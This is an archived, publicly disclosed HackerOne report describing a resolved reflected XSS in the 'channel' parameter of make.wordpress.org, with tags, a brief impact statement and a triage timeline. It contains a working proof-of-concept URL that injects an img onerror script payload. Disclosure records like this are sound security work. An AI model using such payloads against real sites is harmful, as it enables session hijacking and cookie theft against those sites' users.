---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
  - stack/wordpress
  - vuln/xss-reflected
  - vuln/xss
  - vuln/authentication-bypass
  - impact/credential-theft
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2019-08-26
submitted: 2019-07-25T10:56:27.823Z
bounty_usd: null
votes: 97
cve: []
program: "[[programs/wordpress|WordPress]]"
reporter: "gnux"
source: "https://hackerone.com/reports/659419"
title: "Reflected XSS on https://make.wordpress.org via 'channel' parameter"
---
# Reflected XSS on https://make.wordpress.org via 'channel' parameter

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 97 | **Program:** WordPress | **Disclosed:** 2019-08-26

- Report: [https://hackerone.com/reports/659419](https://hackerone.com/reports/659419)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2019-07-25T10:56:27.823Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi there,
I just found a reflected XSS on make.wordpress.org domain.

steps to reproduce : 
1. visit this link :
https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
2. xss pop up will occurs

POC:
see:wp reflected xss.png

Note: it works on the latest version of firefox

## Impact

some of xss impact like stealing cookies, session hijacking, etc ..

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **2019-07-26** @gnux: Thanks @iandunn  , happy hear from you I'll be waiting next update from you
- **2019-07-26** @gnux: by the way please change the "Asset" , my bad i was wrong. it should be wordpress.org
- **Changed Scope**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2019-07-29** @iandunn: We don't offer swag anymore, because the logistics were too cumbersome. We do have a swag store at https://mercantile.wordpress.org/ if you'd like to purchase some with your bounty, though.
- **Report Became Public**
